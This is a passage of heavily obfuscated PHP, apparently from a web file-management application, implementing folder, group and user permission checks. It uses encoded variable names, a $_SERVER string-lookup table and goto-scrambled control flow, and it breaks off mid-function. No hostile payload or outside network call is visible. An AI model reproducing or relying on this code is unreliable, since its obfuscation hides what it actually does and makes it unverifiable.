=> $a¾ìƒ…Õ¾è[516], $a¾ìƒ…Õ¾è[493] => $DÚŒ…¨ŒÀ[$a¾ìƒ…Õ¾è[489]], $a¾ìƒ…Õ¾è[1689] => $DÚŒ…¨ŒÀ[$a¾ìƒ…Õ¾è[1689]], $a¾ìƒ…Õ¾è[486] => $DÚŒ…¨ŒÀ[$a¾ìƒ…Õ¾è[476]], $a¾ìƒ…Õ¾è[1860] => array($b„ôßÔŠ”)); $A¨ŒÎÖ¯ù[$d—¾˜™ùá[$a¾ìƒ…Õ¾è[394]]] = $d—¾˜™ùá; } } $DÎ…»ÌÂ»‘ = array(); $c³Á¿ô’ŸÙ = $this->getAllChildren($càÁ±ÌÔ–„); goto Döš¸œ; Döš¸œ: foreach ($c³Á¿ô’ŸÙ as $fŒí³òí¹›) { $F…§É–® = !1; foreach ($fŒí³òí¹›[$a¾ìƒ…Õ¾è[1860]] as $aÂŒ½í¨§) { if ($aÂŒ½í¨§[$a¾ìƒ…Õ¾è[1526]]) { if ($aÂŒ½í¨§[$a¾ìƒ…Õ¾è[1526]] == $D´ë§ˆ£ö) { $F…§É–® = !0; break; } } if ($aÂŒ½í¨§[$a¾ìƒ…Õ¾è[1689]]) { if ($this->groupContainUser($aÂŒ½í¨§[$a¾ìƒ…Õ¾è[1689]], $D´ë§ˆ£ö)) { $F…§É–® = !0; break; } } } if ($F…§É–®) { $DÎ…»ÌÂ»‘[] = $fŒí³òí¹›; } $C»Õè·†Úè = $fŒí³òí¹›[$a¾ìƒ…Õ¾è[394]]; if (isset($A¨ŒÎÖ¯ù[$C»Õè·†Úè])) { $fŒí³òí¹›[$a¾ìƒ…Õ¾è[1860]][] = $A¨ŒÎÖ¯ù[$C»Õè·†Úè][0]; $A¨ŒÎÖ¯ù[$C»Õè·†Úè] = !1; } } $A¨ŒÎÖ¯ù = array_filter(array_values($A¨ŒÎÖ¯ù)); $DÎ…»ÌÂ»‘ = array_merge($A¨ŒÎÖ¯ù, $DÎ…»ÌÂ»‘); goto E±ˆ¹‰ä¸‘; F·½£¿×ã‹: } public function setAllChildrenByUser($D‘³†âé‡–, $dÛÉƒÚ¢Ò, $D¿¸ğ¹¡‹í) { $e§¾›Ğâ¥ë =& $_SERVER[Ç³Íß¦Ó]; $dŒ¨â‘äÓÜ = $this->getAllChildrenByUser($D‘³†âé‡–, $dÛÉƒÚ¢Ò); if (!$D¿¸ğ¹¡‹í || !$dŒ¨â‘äÓÜ) { return !1; } foreach ($dŒ¨â‘äÓÜ as $eëŠ•®Èï¸) { $cœŒ¬êâƒ“ = array(); foreach ($eëŠ•®Èï¸[$e§¾›Ğâ¥ë[1860]] as $eÍ††‘³ùõ) { $BÉÄñƒ¡ŞÍ = $eÍ††‘³ùõ[$e§¾›Ğâ¥ë[444]]; $AÉŠóÍ”„ = $eÍ††‘³ùõ[$e§¾›Ğâ¥ë[1526]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $B¢÷†“¨¶á = $eÍ††‘³ùõ[$e§¾›Ğâ¥ë[1526]] ? $eÍ††‘³ùõ[$e§¾›Ğâ¥ë[1526]] : $eÍ††‘³ùõ[$e§¾›Ğâ¥ë[1689]]; if ($eÍ††‘³ùõ[$e§¾›Ğâ¥ë[1526]] && $eÍ††‘³ùõ[$e§¾›Ğâ¥ë[1526]] == $dÛÉƒÚ¢Ò) { continue; } $cœŒ¬êâƒ“[] = array($e§¾›Ğâ¥ë[394] => $eëŠ•®Èï¸[$e§¾›Ğâ¥ë[394]], $e§¾›Ğâ¥ë[402] => $AÉŠóÍ”„, $e§¾›Ğâ¥ë[482] => intval($B¢÷†“¨¶á), $e§¾›Ğâ¥ë[1784] => isset($BÉÄñƒ¡ŞÍ[$e§¾›Ğâ¥ë[392]]) ? intval($BÉÄñƒ¡ŞÍ[$e§¾›Ğâ¥ë[392]]) : 0, $e§¾›Ğâ¥ë[1838] => isset($BÉÄñƒ¡ŞÍ[$e§¾›Ğâ¥ë[1838]]) ? intval($BÉÄñƒ¡ŞÍ[$e§¾›Ğâ¥ë[1838]]) : -1); } $cœŒ¬êâƒ“[] = array($e§¾›Ğâ¥ë[394] => $eëŠ•®Èï¸[$e§¾›Ğâ¥ë[394]], $e§¾›Ğâ¥ë[402] => SourceModel::TYPE_USER, $e§¾›Ğâ¥ë[482] => intval($dÛÉƒÚ¢Ò), $e§¾›Ğâ¥ë[1784] => intval($D¿¸ğ¹¡‹í), $e§¾›Ğâ¥ë[1838] => -1); $this->where(array($e§¾›Ğâ¥ë[408] => $eëŠ•®Èï¸[$e§¾›Ğâ¥ë[394]]))->delete(); $this->addAll($cœŒ¬êâƒ“); } return !0; } public function get($AÜÊÆå‹´Ô) { $FÇ±óÏÍ•ğ = $this->getSourceList(array($AÜÊÆå‹´Ô), !0); return $FÇ±óÏÍ•ğ[0]; } public function getSourceList($f×Ñ»²½†©, $b—º¯ñò¦„ = false, $BÙëù ßß = false) { goto CØØÛÅÆ˜; c½òìĞ„‡: foreach ($b—º¯ñò¦„ as $eÆ¦ƒÍ®‡‡ => $b¤Ï‘Ù¶à) { $F‹óçÑéª³ = $C¥£ª·¿Œ->parentLevelArray($b¤Ï‘Ù¶à[$eÊ—±ËÒÍç[485]]); $céŞ¿Ë•ï† = array_merge($céŞ¿Ë•ï†, array($eÆ¦ƒÍ®‡‡), array_reverse($F‹óçÑéª³)); } $céŞ¿Ë•ï† = array_values(array_unique($céŞ¿Ë•ï†)); if (!$céŞ¿Ë•ï†) { return array(); } goto a’òˆì‰Û„; c•Ñ¶¸º ¨: $aÃİ¦‹¼¡Û = $this->userIsRoot($BÙëù ßß); $Cá“ˆ¢‰ = AuthModel::authAll(); $eã®³¬“™õ = array($eÊ—±ËÒÍç[405] => $Cá“ˆ¢‰, $eÊ—±ËÒÍç[1865] => array($eÊ—±ËÒÍç[410] => 0, $eÊ—±ËÒÍç[1695] => $Cá“ˆ¢‰, $eÊ—±ËÒÍç[411] => LNG($eÊ—±ËÒÍç[1866]), $eÊ—±ËÒÍç[1710] => $eÊ—±ËÒÍç[1867])); goto f³Ü¬Õ£‡å; a’òˆì‰Û„: $f˜·¬×É×Ñ = $this->sourceAuthSelect($céŞ¿Ë•ï†); $A³÷Ò²ßİá = array(); foreach ($céŞ¿Ë•ï† as $c°õæ¹„„˜) { if (isset($f˜·¬×É×Ñ[$c°õæ¹„„˜])) { $A³÷Ò²ßİá[$c°õæ¹„„˜] = $f˜·¬×É×Ñ[$c°õæ¹„„˜]; } } goto c•Ñ¶¸º ¨; f³Ü¬Õ£‡å: $aŠ™»ë‘¦Ñ = array(); foreach ($b—º¯ñò¦„ as $c°õæ¹„„˜ => $DÏó“³„ŒÅ) { if ($aÃİ¦‹¼¡Û) { $aŠ™»ë‘¦Ñ[$c°õæ¹„„˜] = $eã®³¬“™õ; continue; } $aŠ™»ë‘¦Ñ[$c°õæ¹„„˜] = $this->makeSourceAuth($DÏó“³„ŒÅ, $A³÷Ò²ßİá, $BÙëù ßß); } return $aŠ™»ë‘¦Ñ; goto FÎ¾—ßµ¤; fùˆ™ˆ¶¨³: if (!$b—º¯ñò¦„ && count($f×Ñ»²½†©) == 1) { $b—º¯ñò¦„ = array(); $b—º¯ñò¦„[$f×Ñ»²½†©[0]] = $C¥£ª·¿Œ->sourceInfo($f×Ñ»²½†©[0]); } if (!$b—º¯ñò¦„) { $B™…Ğ¡²ò¡ = array($eÊ—±ËÒÍç[408] => array($eÊ—±ËÒÍç[409], $f×Ñ»²½†©)); $b—º¯ñò¦„ = $C¥£ª·¿Œ->field($eÊ—±ËÒÍç[1864])->where($B™…Ğ¡²ò¡)->select(); $b—º¯ñò¦„ = array_to_keyvalue($b—º¯ñò¦„, $eÊ—±ËÒÍç[394]); } $céŞ¿Ë•ï† = $f×Ñ»²½†©; goto c½òìĞ„‡; CØØÛÅÆ˜: $eÊ—±ËÒÍç =& $_SERVER[Ç³Íß¦Ó]; if (!$f×Ñ»²½†©) { return array(); } $C¥£ª·¿Œ = Model($eÊ—±ËÒÍç[1204]); goto fùˆ™ˆ¶¨³; FÎ¾—ßµ¤: } public function authDeepCheck($b¯§ æ¥“İ, $dÙãä£÷È« = false) { goto F»ßç—ºÆ; bÙ’¹ƒä‹Ì: if (!in_array($b¯§ æ¥“İ, $A»ÒİŒàäˆ[$Dç‡˜¡Õ[1868]])) { return !1; } $DêÔ„ÁŠã = array(); foreach ($A»ÒİŒàäˆ[$Dç‡˜¡Õ[1869]] as $Fñ“‘å => $Dõº½¾Å) { if (!in_array($b¯§ æ¥“İ, $Dõº½¾Å)) { continue; } $DêÔ„ÁŠã[] = $Fñ“‘å; } goto Eë™”ò‘†Š; Eë™”ò‘†Š: if (!$DêÔ„ÁŠã) { return !1; } $F¨Œ‰íà„Ñ = $DêÔ„ÁŠã ? $DêÔ„ÁŠã[0] : $b¯§ æ¥“İ; return array($Dç‡˜¡Õ[405] => -1, $Dç‡˜¡Õ[444] => array($Dç‡˜¡Õ[410] => $Dç‡˜¡Õ[1085], $Dç‡˜¡Õ[1695] => $Dç‡˜¡Õ[495], $Dç‡˜¡Õ[411] => LNG($Dç‡˜¡Õ[1870]), $Dç‡˜¡Õ[1710] => $Dç‡˜¡Õ[1871]), $Dç‡˜¡Õ[1872] => LNG($Dç‡˜¡Õ[1873]), $Dç‡˜¡Õ[1874] => $this->sourceAuthInfo($F¨Œ‰íà„Ñ)); goto BœÁ‚–åß”; F»ßç—ºÆ: $Dç‡˜¡Õ =& $_SERVER[Ç³Íß¦Ó]; $dÙãä£÷È« = $dÙãä£÷È« ? $dÙãä£÷È« : USER_ID; $A»ÒİŒàäˆ = $this->makeAuthDeep($dÙãä£÷È«); goto bÙ’¹ƒä‹Ì; BœÁ‚–åß”: } protected function makeAuthDeep($eÊ¹„ƒÕ®’ = false) { goto bŒí•¹¦Æ‘; F´ù¸¿Óß©: if (isset($b‚µªçğ è[$eÊ¹„ƒÕ®’])) { return $b‚µªçğ è[$eÊ¹„ƒÕ®’]; } $cìñÒğ˜ˆ„ = Model($E”²„¬¿µ[1875])->listData(); $C»ãĞš¿¼ = array(); goto DµãÓï¤Ü†; dŠòóµŠõ’: $EÌ¼Ï¦Ş¿ = array($E”²„¬¿µ[1868] => $A°õØŒºƒ±, $E”²„¬¿µ[1869] => $cÌ¥ãñÂ¡Ï); $b‚µªçğ è[$eÊ¹„ƒÕ®’] = $EÌ¼Ï¦Ş¿; return $EÌ¼Ï¦Ş¿; goto c¡Ğœ¥Õ¬…; bŒí•¹¦Æ‘: $E”²„¬¿µ =& $_SERVER[Ç³Íß¦Ó]; static $b‚µªçğ è = array(); $eÊ¹„ƒÕ®’ = $eÊ¹„ƒÕ®’ ? $eÊ¹„ƒÕ®’ : USER_ID; goto F´ù¸¿Óß©; EóÓˆ¥»: $dñùÉÎƒŒ = array_to_keyvalue_group($cñŞ·ÁÍñƒ, $E”²„¬¿µ[394]); foreach ($dñùÉÎƒŒ as $BŞÆî„ŞÓ” => $bÅí·ˆèçŒ) { $D‰Ÿ­¦ÎÔ = $this->authArrayCheck($bÅí·ˆèçŒ, $eÊ¹„ƒÕ®’); if ($D‰Ÿ­¦ÎÔ[$E”²„¬¿µ[405]] > 0) { $E¹ÓßõÔĞŠ[] = $BŞÆî„ŞÓ” . $E”²„¬¿µ[33]; } } $A°õØŒºƒ± = array(); goto d«æÅ—Í˜; dŠÉãïÅĞ®: $b¸‡“÷Ò® = $BùŠ¶¨ùß‹; foreach ($b¸‡“÷Ò® as $CÁ¡ƒÀíÚ…) { $b…Õµ±ƒ•‰ = $aÅ© ÁÛÄŠ->getInfo($CÁ¡ƒÀíÚ…); $c¦š‚Ë˜ = $BŒÓàİ‰¾é->parentLevelArray($b…Õµ±ƒ•‰[$E”²„¬¿µ[485]]); $BùŠ¶¨ùß‹ = array_merge($BùŠ¶¨ùß‹, $c¦š‚Ë˜); } $BùŠ¶¨ùß‹ = array_values(array_unique($BùŠ¶¨ùß‹)); goto C»¬Ğ•‹à; d«æÅ—Í˜: $BùŠ¶¨ùß‹ = $D¹äçìÓÛÛ; $BŒÓàİ‰¾é = Model($E”²„¬¿µ[1204]); $aÅ© ÁÛÄŠ = Model($E”²„¬¿µ[484]); goto D…ĞÕö©›; fÉ’ƒÆĞÄØ: $Fë¤§¶›Ï = array(); if ($E¹ÓßõÔĞŠ) { $BÙ¡‹ÆÙ¿œ = $BŒÓàİ‰¾é->where(array($E”²„¬¿µ[394] => array($E”²„¬¿µ[409], $E¹ÓßõÔĞŠ)))->select(); foreach ($BÙ¡‹ÆÙ¿œ as $aì“ß³œã) { $c¦š‚Ë˜ = $BŒÓàİ‰¾é->parentLevelArray($aì“ß³œã[$E”²„¬¿µ[485]]); $A°õØŒºƒ± = array_merge($A°õØŒºƒ±, $c¦š‚Ë˜); $BùŠ¶¨ùß‹[] = $aì“ß³œã[$E”²„¬¿µ[482]]; $cÌ¥ãñÂ¡Ï[$aì“ß³œã[$E”²„¬¿µ[394]]] = $c¦š‚Ë˜; $eÑŠ‘óƒù[$aì“ß³œã[$E”²„¬¿µ[394]]] = $aì“ß³œã[$E”²„¬¿µ[482]]; } } $BùŠ¶¨ùß‹ = array_values(array_unique($BùŠ¶¨ùß‹)); goto dŠÉãïÅĞ®; AÚË¡æòÎÍ: if ($D¹äçìÓÛÛ) { $fô ª¤¿–¹ = array(array($E”²„¬¿µ[402] => SourceModel::TYPE_USER, $E”²„¬¿µ[482] => $eÊ¹„ƒÕ®’), array($E”²„¬¿µ[402] => SourceModel::TYPE_GROUP, $E”²„¬¿µ[482] => array($E”²„¬¿µ[409], $D¹äçìÓÛÛ)), $E”²„¬¿µ[957] => $E”²„¬¿µ[1776]); } $cñŞ·ÁÍñƒ = $this->field($E”²„¬¿µ[1876])->where($fô ª¤¿–¹)->select(); $E¹ÓßõÔĞŠ = array(); goto EóÓˆ¥»; DµãÓï¤Ü†: foreach ($cìñÒğ˜ˆ„ as $Eçë¶ƒÄóŠ) { if ($Eçë¶ƒÄóŠ[$E”²„¬¿µ[404]] == 0 && $Eçë¶ƒÄóŠ[$E”²„¬¿µ[1711]] == $E”²„¬¿µ[87]) { $C»ãĞš¿¼[] = $Eçë¶ƒÄóŠ[$E”²„¬¿µ[392]]; } } $D¹äçìÓÛÛ = $this->userGroupParents($eÊ¹„ƒÕ®’); $fô ª¤¿–¹ = array($E”²„¬¿µ[402] => SourceModel::TYPE_USER, $E”²„¬¿µ[482] => $eÊ¹„ƒÕ®’); goto AÚË¡æòÎÍ; C»¬Ğ•‹à: foreach ($BùŠ¶¨ùß‹ as $CÁ¡ƒÀíÚ…) { $b…Õµ±ƒ•‰ = $aÅ© ÁÛÄŠ->getInfo($CÁ¡ƒÀíÚ…); $A°õØŒºƒ±[] = $b…Õµ±ƒ•‰[$E”²„¬¿µ[85]][$E”²„¬¿µ[394]]; $e–ïêŒ˜™Ã[$CÁ¡ƒÀíÚ…] = $b…Õµ±ƒ•‰[$E”²„¬¿µ[85]][$E”²„¬¿µ[394]]; $Fë¤§¶›Ï[$CÁ¡ƒÀíÚ…] = $BŒÓàİ‰¾é->parentLevelArray($b…Õµ±ƒ•‰[$E”²„¬¿µ[485]]); } foreach ($cÌ¥ãñÂ¡Ï as $cÉ¸ù¢µ => $Eùˆ‚†­ç‰) { $f©Œ”‰›¯ö = $eÑŠ‘óƒù[$cÉ¸ù¢µ]; if (!$f©Œ”‰›¯ö || !$e–ïêŒ˜™Ã[$f©Œ”‰›¯ö]) { continue; } $Fáæ„æ©© = array(); foreach ($Fë¤§¶›Ï[$f©Œ”‰›¯ö] as $CÁ¡ƒÀíÚ…) { $Fáæ„æ©©[] = $e–ïêŒ˜™Ã[$CÁ¡ƒÀíÚ…]; } $cÌ¥ãñÂ¡Ï[$cÉ¸ù¢µ] = array_merge($Fáæ„æ©©, $Eùˆ‚†­ç‰); } $A°õØŒºƒ± = array_values(array_unique($A°õØŒºƒ±)); goto dŠòóµŠõ’; D…ĞÕö©›: $cÌ¥ãñÂ¡Ï = array(); $eÑŠ‘óƒù = array(); $e–ïêŒ˜™Ã = array(); goto fÉ’ƒÆĞÄØ; c¡Ğœ¥Õ¬…: } private function makeSourceAuth($Cùß¹™Âé, $cƒ¦à‰ƒé, $D±¸Ü›ù÷Û = false) { goto FÏŠˆÌï¢¬; d¿°é§á¢Ø: if (!$dæ¥Ñ°ç­Ü) { $b‚°Èœ÷®¸ = Model($C‰ŒØñ‚Ñ[484])->getInfo($Dø¾ùØÊ¥²); $bÑ®÷µƒÆ = explode($C‰ŒØñ‚Ñ[47], trim($b‚°Èœ÷®¸[$C‰ŒØñ‚Ñ[485]], $C‰ŒØñ‚Ñ[47])); $bÑ®÷µƒÆ = array_reverse($bÑ®÷µƒÆ); foreach ($bÑ®÷µƒÆ as $aä¯¬Úëèƒ) { if ($aä¯¬Úëèƒ == $C‰ŒØñ‚Ñ[495] || $aä¯¬Úëèƒ == $dØñâ÷ğ) { continue; } $e¹ÅˆšœÙ = $this->groupRootAuth($aä¯¬Úëèƒ, $D±¸Ü›ù÷Û); if (!$e¹ÅˆšœÙ) { continue; } $dæ¥Ñ°ç­Ü = $this->groupAuthInfo($e¹ÅˆšœÙ, $aä¯¬Úëèƒ); break; } } if (!$dæ¥Ñ°ç­Ü || $dæ¥Ñ°ç­Ü[$C‰ŒØñ‚Ñ[405]] <= 0) { $fß–Ú•›±² = $this->authDeepCheck($Cùß¹™Âé[$C‰ŒØñ‚Ñ[394]], $D±¸Ü›ù÷Û); if ($fß–Ú•›±²) { $dæ¥Ñ°ç­Ü = $fß–Ú•›±²; } } return $dæ¥Ñ°ç­Ü; goto DêÃà„Ä×š; d¶­®¼Ÿ±: foreach ($eƒŒËŞ„²  as $d†õ­Š›©) { if (!isset($cƒ¦à‰ƒé[$d†õ­Š›©])) { continue; } $C¾¼ºÁ¢…Ä = $this->authMake($cƒ¦à‰ƒé[$d†õ­Š›©], $D±¸Ü›ù÷Û); if ($C¾¼ºÁ¢…Ä[$C‰ŒØñ‚Ñ[444]]) { $dæ¥Ñ°ç­Ü = $C¾¼ºÁ¢…Ä; break; } } if (!$B«©ƒ£Ş…½) { return $dæ¥Ñ°ç­Ü; } if (!$dæ¥Ñ°ç­Ü && $D°Û…”†œ‰) { $dæ¥Ñ°ç­Ü = $this->groupAuthInfo($D°Û…”†œ‰, $Dø¾ùØÊ¥²); } goto d¿°é§á¢Ø; Då››ÚŞá: $eƒŒËŞ„²  = Model($C‰ŒØñ‚Ñ[1204])->parentLevelArray($Cùß¹™Âé[$C‰ŒØñ‚Ñ[485]]); $eƒŒËŞ„²  = array_merge(array($Cùß¹™Âé[$C‰ŒØñ‚Ñ[394]]), array_reverse($eƒŒËŞ„² )); $dæ¥Ñ°ç­Ü = !1; goto d¶­®¼Ÿ±; d÷¸‹øà¼: $B«©ƒ£Ş…½ = $Cùß¹™Âé[$C‰ŒØñ‚Ñ[402]] == SourceModel::TYPE_GROUP; $D°Û…”†œ‰ = $B«©ƒ£Ş…½ ? $this->groupRootAuth($Dø¾ùØÊ¥², $D±¸Ü›ù÷Û) : !1; if ($D°Û…”†œ‰ && Model($C‰ŒØñ‚Ñ[1856])->authCheckAction($D°Û…”†œ‰[$C‰ŒØñ‚Ñ[404]], $C‰ŒØñ‚Ñ[1709])) { return $this->groupAuthInfo($D°Û…”†œ‰, $Dø¾ùØÊ¥²); } goto Då››ÚŞá; FÏŠˆÌï¢¬: $C‰ŒØñ‚Ñ =& $_SERVER[Ç³Íß¦Ó]; $dØñâ÷ğ = $C‰ŒØñ‚Ñ[87]; $Dø¾ùØÊ¥² = $Cùß¹™Âé[$C‰ŒØñ‚Ñ[482]]; goto d÷¸‹øà¼; DêÃà„Ä×š: } private function userIsRoot($FÕ¾ƒ×éÅ‡ = false) { $d¿ì±Îš‚ =& $_SERVER[Ç³Íß¦Ó]; if (!$FÕ¾ƒ×éÅ‡ && _get($GLOBALS, $d¿ì±Îš‚[483])) { return !0; } $cáÊâÜª´Ä = Model($d¿ì±Îš‚[505])->getInfo($FÕ¾ƒ×éÅ‡); $AøÖ‘Ôó×Ö = Model($d¿ì±Îš‚[1877])->listData($cáÊâÜª´Ä[$d¿ì±Îš‚[1412]]); if ($AøÖ‘Ôó×Ö && $AøÖ‘Ôó×Ö[$d¿ì±Îš‚[1281]][$d¿ì±Îš‚[1878]] == 1) { return !0; } return !1; } private function sourceAuthInfo($cŞ„Ù‚‹) { goto d°â÷°•Ï–; cÚíƒ¦¹¬Œ: if (isset($CôÀÒƒøĞÜ[$f‡Áìñ[490]])) { $Fãœã¶ËØØ = explode($f‡Áìñ[8], trim($CôÀÒƒøĞÜ[$f‡Áìñ[493]], $f‡Áìñ[8])); array_shift($Fãœã¶ËØØ); $d¼ïõìÂöÒ = $CôÀÒƒøĞÜ[$f‡Áìñ[488]] . $f‡Áìñ[1879] . implode($f‡Áìñ[8], $Fãœã¶ËØØ); } return array($f‡Áìñ[411] => $CôÀÒƒøĞÜ[$f‡Áìñ[28]], $f‡Áìñ[76] => KodIO::make($CôÀÒƒøĞÜ[$f‡Áìñ[394]]), $f‡Áìñ[1880] => $d¼ïõìÂöÒ); goto f«ŠĞƒÈÏ¬; B‹½ĞÃŠ›±: if (!$CôÀÒƒøĞÜ) { return !1; } $BŒ­÷—Ü‚©->groupPathDisplay($CôÀÒƒøĞÜ); $a¤”Éˆ…”† = array($CôÀÒƒøĞÜ); goto AôÔŒ‰õ†¯; AôÔŒ‰õ†¯: $a¤”Éˆ…”† = $BŒ­÷—Ü‚©->_listAppendPath($a¤”Éˆ…”†); $CôÀÒƒøĞÜ = $a¤”Éˆ…”†[0]; $d¼ïõìÂöÒ = $CôÀÒƒøĞÜ[$f‡Áìñ[493]]; goto cÚíƒ¦¹¬Œ; d°â÷°•Ï–: $f‡Áìñ =& $_SERVER[Ç³Íß¦Ó]; $BŒ­÷—Ü‚© = Model($f‡Áìñ[1204]); $CôÀÒƒøĞÜ = $BŒ­÷—Ü‚©->sourceInfo($cŞ„Ù‚‹); goto B‹½ĞÃŠ›±; f«ŠĞƒÈÏ¬: } private function groupAuthInfo($AØÛ«õÃ’Ã, $Fç‚¦«Ã³Š) { $aß¡¤ëÆ½ =& $_SERVER[Ç³Íß¦Ó]; $B¥øŸ÷ç¶ = Model($aß¡¤ëÆ½[484])->getInfo($Fç‚¦«Ã³Š); return array($aß¡¤ëÆ½[1881] => intval($AØÛ«õÃ’Ã[$aß¡¤ëÆ½[404]]), $aß¡¤ëÆ½[1865] => $AØÛ«õÃ’Ã, $aß¡¤ëÆ½[1882] => LNG($aß¡¤ëÆ½[1883]), $aß¡¤ëÆ½[1874] => array($aß¡¤ëÆ½[411] => $B¥øŸ÷ç¶[$aß¡¤ëÆ½[28]], $aß¡¤ëÆ½[76] => KodIO::make($B¥øŸ÷ç¶[$aß¡¤ëÆ½[85]][$aß¡¤ëÆ½[394]]), $aß¡¤ëÆ½[1880] => $B¥øŸ÷ç¶[$aß¡¤ëÆ½[489]])); } protected function groupRootAuth($f¡…¨Š…ˆ, $d‹îÖ¡ÎÑ = false) { goto C¢³æ¡ÎÎ‡; dÄ§ùÇïí: $CÚº—†™Â¤ = $this->sourceAuthSelect($dÑÀ‘ÚÚÈ[$bÜÉ‚À†Ş‘[85]][$bÜÉ‚À†Ş‘[394]]); $EëÆ‘ÂÊ½¼ = $CÚº—†™Â¤ ? $this->authMake($CÚº—†™Â¤, $d‹îÖ¡ÎÑ) : !1; $eøçÔ¸•š = $EëÆ‘ÂÊ½¼ ? $EëÆ‘ÂÊ½¼[$bÜÉ‚À†Ş‘[444]] : !1; goto DÂÅà‚Š·; C¢³æ¡ÎÎ‡: $bÜÉ‚À†Ş‘ =& $_SERVER[Ç³Íß¦Ó]; $d‹îÖ¡ÎÑ = $d‹îÖ¡ÎÑ ? $d‹îÖ¡ÎÑ : USER_ID; $D½­†‰á˜‘ = $d‹îÖ¡ÎÑ . $bÜÉ‚À†Ş‘[1884] . $f¡…¨Š…ˆ; goto cÍö×‘¨¨Î; dùˆøçóƒ›: $D“ù¦˜÷‡» = $this->userGroupList($d‹îÖ¡ÎÑ); $c†Ü’¿ƒ®ï = isset($D“ù¦˜÷‡»[$f¡…¨Š…ˆ]) ? $D“ù¦˜÷‡»[$f¡…¨Š…ˆ][$bÜÉ‚À†Ş‘[404]] : !1; if ($c†Ü’¿ƒ®ï && Model($bÜÉ‚À†Ş‘[1856])->authCheckAction($c†Ü’¿ƒ®ï[$bÜÉ‚À†Ş‘[404]], $bÜÉ‚À†Ş‘[1709])) { $a£ùËÏ•ªº[$D½­†‰á˜‘] = $c†Ü’¿ƒ®ï; return $c†Ü’¿ƒ®ï; } goto dÄ§ùÇïí; DÂÅà‚Š·: $a£ùËÏ•ªº[$D½­†‰á˜‘] = $eøçÔ¸•š ? $eøçÔ¸•š : $c†Ü’¿ƒ®ï; return $a£ùËÏ•ªº[$D½­†‰á˜‘]; goto C¸©Í»œİ´; cÍö×‘¨¨Î: static $a£ùËÏ•ªº = array(); if (isset($a£ùËÏ•ªº[$D½­†‰á˜‘])) { return $a£ùËÏ•ªº[$D½­†‰á˜‘]; } $dÑÀ‘ÚÚÈ = Model($bÜÉ‚À†Ş‘[484])->getInfo($f¡…¨Š…ˆ); goto dùˆøçóƒ›; C¸©Í»œİ´: } public function authOwnerApply($D†Â‘¾ƒÜ) { goto fÒ»¬†›àÌ; D§¢Å§ë: if (count($díŞó·é–) == 0) { $díŞó·é– = $this->authFolderOwnerGroup($D†Â‘¾ƒÜ[$D–ò¡õ¹–é[482]]); } $díŞó·é– = array_unique($díŞó·é–); if (AuthModel::authCheckRoot($D†Â‘¾ƒÜ[$D–ò¡õ¹–é[404]][$D–ò¡õ¹–é[405]])) { $díŞó·é–[] = USER_ID; } goto bŸËæ÷…ĞÑ; EùùÊ¶ˆ¥İ: $c¦‹‹ù¼Íµ = Model($D–ò¡õ¹–é[1204])->parentLevelArray($D†Â‘¾ƒÜ[$D–ò¡õ¹–é[485]]); $c¦‹‹ù¼Íµ = array_merge(array($D†Â‘¾ƒÜ[$D–ò¡õ¹–é[394]]), array_reverse($c¦‹‹ù¼Íµ)); $d¿èÕ…‚¾ = $this->sourceAuthSelect($c¦‹‹ù¼Íµ); goto Bß±øë²š™; Bß±øë²š™: $bÜ¢î¤…¿ = array(); $díŞó·é– = array(); foreach ($d¿èÕ…‚¾ as $fìÕĞ¶èŒ => $BèåÊé¡®) { $f­Ş‡Ù±­¹ = $this->authFolderOwnerUser($BèåÊé¡®); $bÜ¢î¤…¿[$fìÕĞ¶èŒ] = $f­Ş‡Ù±­¹; $díŞó·é– = array_merge($díŞó·é–, $f­Ş‡Ù±­¹[$D–ò¡õ¹–é[561]]); if ($f­Ş‡Ù±­¹[$D–ò¡õ¹–é[1886]]) { break; } } goto D§¢Å§ë; bŸËæ÷…ĞÑ: $D†Â‘¾ƒÜ[$D–ò¡õ¹–é[404]][$D–ò¡õ¹–é[1887]] = Model($D–ò¡õ¹–é[501])->userListInfo($díŞó·é–); return $D†Â‘¾ƒÜ; goto DÀŠÕÁ¯Ø‰; fÒ»¬†›àÌ: $D–ò¡õ¹–é =& $_SERVER[Ç³Íß¦Ó]; if (empty($D†Â‘¾ƒÜ[$D–ò¡õ¹–é[404]]) || isset($D†Â‘¾ƒÜ[$D–ò¡õ¹–é[1885]]) && $D†Â‘¾ƒÜ[$D–ò¡õ¹–é[1885]]) { return $D†Â‘¾ƒÜ; } if (AuthModel::authCheckRoot($D†Â‘¾ƒÜ[$D–ò¡õ¹–é[404]][$D–ò¡õ¹–é[405]])) { return $D†Â‘¾ƒÜ; } goto EùùÊ¶ˆ¥İ; DÀŠÕÁ¯Ø‰: } private function authFolderOwnerGroup($bŸ˜³É”å) { $FˆšŒÃğÃ =& $_SERVER[Ç³Íß¦Ó]; $DÅƒõƒÎ³ù = Model($FˆšŒÃğÃ[1770])->where(array($FˆšŒÃğÃ[1689] => $bŸ˜³É”å))->select(); $BçŞšÍ©ŞÇ = array(); if (!$DÅƒõƒÎ³ù) { return $BçŞšÍ©ŞÇ; } foreach ($DÅƒõƒÎ³ù as $dæ„¬‰Ş¬¼) { $fÓ¤ìï‘á = $this->authInfo($dæ„¬‰Ş¬¼); if (AuthModel::authCheckRoot($fÓ¤ìï‘á[$FˆšŒÃğÃ[404]])) { $BçŞšÍ©ŞÇ[] = $dæ„¬‰Ş¬¼[$FˆšŒÃğÃ[1526]]; } } return $BçŞšÍ©ŞÇ; } private function authFolderOwnerUser($F¨ÄÇé—ì) { $C„íò…ŒŞ¢ =& $_SERVER[Ç³Íß¦Ó]; $dò‰ÑŞ‰ÍÛ = array(); $e›Éö‰¾Œè = !1; foreach ($F¨ÄÇé—ì as $bà¦êõÔš) { $a·Ï–Ãìå– = $this->authInfo($bà¦êõÔš); if ($bà¦êõÔš[$C„íò…ŒŞ¢[482]] == $C„íò…ŒŞ¢[495]) { $e›Éö‰¾Œè = !0; } if ($bà¦êõÔš[$C„íò…ŒŞ¢[402]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($a·Ï–Ãìå–[$C„íò…ŒŞ¢[404]])) { $dò‰ÑŞ‰ÍÛ[] = $bà¦êõÔš[$C„íò…ŒŞ¢[482]]; } } } return array($C„íò…ŒŞ¢[561] => $dò‰ÑŞ‰ÍÛ, $C„íò…ŒŞ¢[1886] => $e›Éö‰¾Œè); } public function authMake($DœË¥‘Ñ¬, $BèÔºßù¤ = false) { $cöÍç™‘Â› =& $_SERVER[Ç³Íß¦Ó]; $E¨ŸË°© = $this->authArrayCheck($DœË¥‘Ñ¬, $BèÔºßù¤); if ($E¨ŸË°©[$cöÍç™‘Â›[1888]]) { 